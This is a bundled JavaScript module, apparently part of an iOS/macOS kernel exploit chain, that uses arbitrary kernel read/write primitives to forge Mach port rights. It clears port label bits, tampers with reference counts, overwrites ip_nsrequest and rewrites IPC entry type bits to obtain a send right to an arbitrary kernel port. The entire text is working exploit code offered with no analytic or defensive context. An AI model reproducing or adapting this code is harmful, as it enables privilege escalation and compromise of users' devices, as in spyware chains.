/***/ "./src/libs/TaskRop/PortRightInserter.js":
/*!***********************************************!*\
  !*** ./src/libs/TaskRop/PortRightInserter.js ***!
  \***********************************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (/* binding */ PortRightInserter)
/* harmony export */ });
/* harmony import */ var libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! libs/Chain/Native */ "./src/libs/Chain/Native.js");
/* harmony import */ var libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! libs/Chain/Chain */ "./src/libs/Chain/Chain.js");
/* harmony import */ var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! libs/JSUtils/Utils */ "./src/libs/JSUtils/Utils.js");
/* harmony import */ var _MachMsgHeaderStruct__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! ./MachMsgHeaderStruct */ "./src/libs/TaskRop/MachMsgHeaderStruct.js");
/* harmony import */ var _Task__WEBPACK_IMPORTED_MODULE_4__ = __webpack_require__(/*! ./Task */ "./src/libs/TaskRop/Task.js");






const TAG = "PORTRIGHTINSERTER";

const TASK_SELF = 0x203;
const MACH_PORT_NULL = 0;
const MACH_PORT_TYPE_SEND = 0x10000;
const MACH_PORT_TYPE_DEAD_NAME = 0x100000;

const MACH_SEND_MSG = 0x00000001n;
const MACH_RCV_MSG = 0x00000002n;
const MACH_SEND_TIMEOUT = 0x00000010n;
const MACH_RCV_TIMEOUT = 0x00000100n;

const MACH_MSG_TYPE_COPY_SEND = 19; 
const MACH_MSG_TYPE_MAKE_SEND = 20;
const MACH_MSG_TYPE_MAKE_SEND_ONCE = 21;

const MACH_MSGH_BITS_COMPLEX = 0x80000000;
const MACH_MSG_PORT_DESCRIPTOR = 0;

const MPO_INSERT_SEND_RIGHT = 0x10;
const MPO_PROVISIONAL_ID_PROT_OPTOUT = 0x8000;

const IO_BITS_KOLABEL = 0x00000400;
const IE_BITS_TYPE_MASK = 0x001f0000;

class PortRightInserter {
	
	static insert(portKaddr) {
		const p = this.#newPort();
		//console.log(TAG, "New port: " + Utils.hex(p));
		const pAddr = _Task__WEBPACK_IMPORTED_MODULE_4__["default"].getPortAddr(BigInt(p));
		//console.log(TAG, "New port addr: " + Utils.hex(pAddr));
		if (!pAddr)
			return 0;

		//this.#dumpPort(portKaddr);
		//this.#dumpPort(pAddr);

		const backupBits = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].read32(portKaddr);
		//console.log(TAG, "Port io bits: " + Utils.hex(backupBits));
		const needsFixBits = (backupBits & IO_BITS_KOLABEL);

		if (needsFixBits) {
			const newBits = backupBits & ~IO_BITS_KOLABEL;
			libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].write32(portKaddr, newBits);
		}

		this.#fixRefCounts(portKaddr, 1);

		//console.log(TAG, "Fix Ok");
		//this.#dumpPort(portKaddr);

		libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].write64(pAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].offsets().ipNsRequest, portKaddr);
		//this.#dumpPort(pAddr);

		let previous = this.#notifyNoSenders(p, MACH_PORT_NULL);
		//console.log(TAG, "Previous right: " + Utils.hex(previous));

		// Change the port rights from send once to send.
		this.#switchToSendRight(previous);

		//this.#fixRefCounts(portKaddr, -1, false);

		// We have a send right to the port, but it's not in our space's hash.
    	// We send the port, then kill the entry. We'll properly receive it afterwards.
		let msgBuff = new ArrayBuffer(40);
		let msgHeader = new _MachMsgHeaderStruct__WEBPACK_IMPORTED_MODULE_3__["default"](msgBuff);
		msgHeader.msgh_id = 0x4141;
		msgHeader.msgh_remote_port = p;
		msgHeader.msgh_local_port = p;
		msgHeader.msgh_size = msgBuff.byteLength;
		msgHeader.msgh_bits = _MachMsgHeaderStruct__WEBPACK_IMPORTED_MODULE_3__["default"].MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, MACH_MSG_TYPE_MAKE_SEND);
		msgHeader.msgh_bits |= MACH_MSGH_BITS_COMPLEX;	// we send a port descriptor

		let msgBody = new DataView(msgBuff, 24);
		msgBody.setInt32(0, 1, true); 					// msgh_descriptor_count
		msgBody.setUint32(4, previous, true);			// name
		msgBody.setUint8(14, MACH_MSG_TYPE_COPY_SEND);	// disposition
		msgBody.setUint8(15, MACH_MSG_PORT_DESCRIPTOR);	// type

		//let wMsg64 = new BigUint64Array(msgBuff);
		//for (let i=0; i<5; i++)
		//	console.log(TAG, `${i}: ${Utils.hex(wMsg64[i]).padStart(16, '0')}`);

		let msgMem = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].mem;
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write(msgMem, msgBuff);
		let ret = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("mach_msg",
			msgMem,
			MACH_SEND_MSG,
			msgBuff.byteLength, 0,
			p,
			0,
			0);
		//console.log(TAG, "mach_msg: " + ret);
		//Native.callSymbol("sleep", 1);
		if (ret != 0) {
			let errString = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("mach_error_string", ret);
			errString = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].readString(errString);
			console.log(TAG, `Error sending message: ${errString}`);
			return 0;
		}

		//console.log(TAG, "mach_msg send: " + ret);

		this.#killRight(previous);

		ret = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("mach_msg",
			msgMem,
			MACH_RCV_MSG | MACH_RCV_TIMEOUT,
			0, libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].memSize,
			p,
			1000,
			0);
		if (ret != 0)
		{
			let errString = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("mach_error_string", ret);
			errString = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].readString(errString);
			console.log(TAG, `Error receiving message: ${errString}`);
			return 0;
		}

		//console.log(TAG, "mach_msg recv: " + ret);
		//Native.callSymbol("sleep", 1);

		let rMsg = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].read(msgMem, 40);

		//let rMsg64 = new BigUint64Array(rMsg);
		//for (let i=0; i<5; i++)
		//	console.log(TAG, `${i}: ${Utils.hex(rMsg64[i]).padStart(16, '0')}`);

		msgBody = new DataView(rMsg, 24);
		previous = msgBody.getUint32(4, true);
		//console.log(TAG, "previous: " + Utils.hex(previous));

		this.#fixRefCounts(portKaddr, -1);

		//this.#dumpPort(portKaddr);

		return previous;
	}

	static #newPort() {
		const options = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].mem;
		const buffer = new ArrayBuffer(8);
		const view = new DataView(buffer);
		view.setUint32(0, MPO_INSERT_SEND_RIGHT, true);
		view.setUint32(4, 0, true);
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write(options, buffer);
		const newPortPtr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].mem + 0x100n;
		let kr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("mach_port_construct", TASK_SELF, options, 0n, newPortPtr);
		if (kr != 0) {
			console.log(TAG, `Error creating port: ${kr}`);
			return MACH_PORT_NULL;
		}
		return libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].read32(newPortPtr);
	}

	static #switchToSendRight(port) {
		const entry = _Task__WEBPACK_IMPORTED_MODULE_4__["default"].getRightAddr(BigInt(port));
		//console.log(TAG, "entry: " + Utils.hex(entry));
		//this.#dumpEntry(entry);
		let bits = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].read32(entry + 0x8n);
		//console.log(TAG, "entry bits: " + Utils.hex(bits));
		bits = (bits & ~IE_BITS_TYPE_MASK) | MACH_PORT_TYPE_SEND;
		libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].write32(entry + 0x8n, bits);
		//this.#dumpEntry(entry);
	}

	static #killRight(port) {
		const entry = _Task__WEBPACK_IMPORTED_MODULE_4__["default"].getRightAddr(BigInt(port));
		//console.log(TAG, "entry: " + Utils.hex(entry));
		//this.#dumpEntry(entry);
		let bits = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].read32(entry + 0x8n);
		//console.log(TAG, "entry bits: " + Utils.hex(bits));
		bits = (bits & ~IE_BITS_TYPE_MASK) | MACH_PORT_TYPE_DEAD_NAME;
		libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].write64(entry, 0n);
		libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].write32(entry + 0x8n, bits);
		//this.#dumpEntry(entry);
	}

	static #fixRefCounts(portAddr, diff, updateRefs=true, updateSonce=true) {
		// Due to krw limitation, we cannot write at offset +132 of a 144 bytes struct,
		// since krw would write in chunks of 32 bytes and so would cause a memory overflow (panic).
		// So we read all the 144 bytes struct, changes values and then write it again as a whole.

		libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].read(portAddr, libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].mem, 144);
		let ipcPort = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].read(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].mem, 144);
		let ipcPortView = new DataView(ipcPort);

		let refs = ipcPortView.getUint32(0x4, true);
		let sonce = ipcPortView.getUint32(Number(libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].offsets().ipSorights), true);

		//console.log(TAG, "refs: " + refs);
		//console.log(TAG, "sonce: " + sonce);

		refs += diff;
		sonce += diff;

		if (updateRefs) {
			//console.log(TAG, "new refs: " + refs);
			ipcPortView.setUint32(0x4, refs, true);
		}
		if (updateSonce) {
			//console.log(TAG, "new sonce: " + sonce);
			ipcPortView.setUint32(Number(libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].offsets().ipSorights), sonce, true);
		}

		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].mem, ipcPort);
		libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].writeZoneElement(portAddr, libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].mem, 144);
	}

	static #notifyNoSenders(port, notifyPort) {
		const MACH_NOTIFY_NO_SENDERS = 0o106;
		
		const previousPtr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].mem;
		const kr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("mach_port_request_notification",
			TASK_SELF,
			port,
			MACH_NOTIFY_NO_SENDERS,
			0,
			notifyPort,
			MACH_MSG_TYPE_MAKE_SEND_ONCE,
			previousPtr);
		//console.log(TAG, "mach_port_request_notification: " + kr);
		if (kr != 0)
			return MACH_PORT_NULL;
		return libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].read32(previousPtr);
	}

	static #dumpPort(pAddr) {
		console.log(TAG, "dump port: " + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__["default"].hex(pAddr));
		libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].read(pAddr, libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].mem, 0x90);
		let buff = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].read(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].mem, 0x90);
		let buff64 = new BigUint64Array(buff);
		for (let i=0; i<0x12; i++)
			console.log(TAG, `${i}: ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__["default"].hex(buff64[i]).padStart(16, '0')}`);
	}

	static #dumpEntry(entryAddr) {
		console.log(TAG, "dump entry: " + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__["default"].hex(entryAddr));
		libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].read(entryAddr, libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].mem, 24);
		let buff = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].read(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].mem, 24);
		let buff64 = new BigUint64Array(buff);
		for (let i=0; i<3; i++)
			console.log(TAG, `${i}: ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__["default"].hex(buff64[i]).padStart(16, '0')}`);
	}
}


/***/ }),
